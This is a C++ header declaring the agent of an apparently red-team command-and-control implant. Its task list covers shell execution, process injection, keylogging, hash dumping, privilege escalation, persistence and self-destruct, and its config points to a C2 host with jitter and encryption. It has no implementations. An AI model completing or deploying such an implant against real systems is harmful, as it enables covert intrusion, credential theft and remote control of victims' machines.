#ifndef RTLC2_AGENT_H
#define RTLC2_AGENT_H

#include <string>
#include <vector>
#include <map>
#include <cstdint>
#include <functional>
#include <memory>

namespace rtlc2 {

// Forward declaration
namespace transport { class Transport; }

// Task types (must match teamserver proto)
enum class TaskType : int {
    Unknown     = 0,
    Shell       = 1,
    Upload      = 2,
    Download    = 3,
    Sleep       = 4,
    Exit        = 5,
    Inject      = 6,
    BOF         = 7,
    Assembly    = 8,
    Screenshot  = 9,
    Keylog      = 10,
    PS          = 11,
    LS          = 12,
    CD          = 13,
    PWD         = 14,
    Whoami      = 15,
    IPConfig    = 16,
    HashDump    = 17,
    Token       = 18,
    Pivot       = 19,
    PortScan    = 20,
    Socks       = 21,
    SelfDestruct = 22,
    Module      = 23,
    Clipboard   = 24,
    RegWrite    = 25,
    ServiceCtl  = 26,
    Jobs        = 27,
    Persist     = 28,
    Unpersist   = 29,
    PrivEsc     = 30,
    FileCopy    = 31,
    FileMove    = 32,
    FileDelete  = 33,
    MkDir       = 34,
    RegQuery    = 35,
    EnvVar      = 36,
    RPortFwd    = 37,
    RunAs       = 38,
    PowerShell  = 39,
    LOLBAS      = 40,
};

// Task from the team server
struct Task {
    std::string task_id;
    TaskType type;
    std::vector<uint8_t> data;
    std::map<std::string, std::string> params;
};

// Task result to send back
struct TaskResult {
    std::string task_id;
    int status; // 2=complete, 3=error
    std::vector<uint8_t> output;
};

// System information gathered on init
struct SystemInfo {
    std::string hostname;
    std::string username;
    std::string os_name;
    std::string arch;
    std::string process_name;
    int pid;
    std::string internal_ip;
    std::string integrity; // low, medium, high, system
};

// Agent configuration
struct AgentConfig {
    std::string c2_host;
    int c2_port;
    bool use_tls;
    int sleep_interval;  // seconds
    int jitter;          // percentage 0-100
    std::string aes_key; // hex-encoded master key
    std::string user_agent;
};

// The main agent class
class Agent {
public:
    Agent(const AgentConfig& config);
    ~Agent();

    // Main agent loop
    void Run();

    // Register with team server
    bool Register();

    // Check-in and get tasks
    bool Checkin();

    // Execute a task
    TaskResult ExecuteTask(const Task& task);

    // Stop the agent
    void Stop();

    // Self-destruct (clean removal)
    void SelfDestruct();

private:
    AgentConfig config_;
    SystemInfo sysinfo_;
    std::string agent_id_;
    std::string session_key_; // hex AES key for session
    bool running_;
    std::vector<TaskResult> pending_results_;

    // Persistent transport (created once by factory)
    std::unique_ptr<transport::Transport> transport_;

    // Task handlers
    using TaskHandler = std::function<TaskResult(const Task&)>;
    std::map<TaskType, TaskHandler> handlers_;

    void RegisterHandlers();
    void CreateTransport();
    int CalculateSleep();
    SystemInfo GatherSystemInfo();
    void ParseAndExecuteTasks(const std::string& json_str);
    bool IsOperationalTime();
};

// Module functions (implemented per-platform)
namespace modules {
    std::string ExecuteShell(const std::string& command);
    std::string GetProcessList();
    std::string ListDirectory(const std::string& path);
    std::string GetCurrentDir();
    bool ChangeDir(const std::string& path);
    std::string GetWhoami();
    std::string GetIPConfig();
    SystemInfo GetSystemInfo();
}

} // namespace rtlc2

#endif // RTLC2_AGENT_H
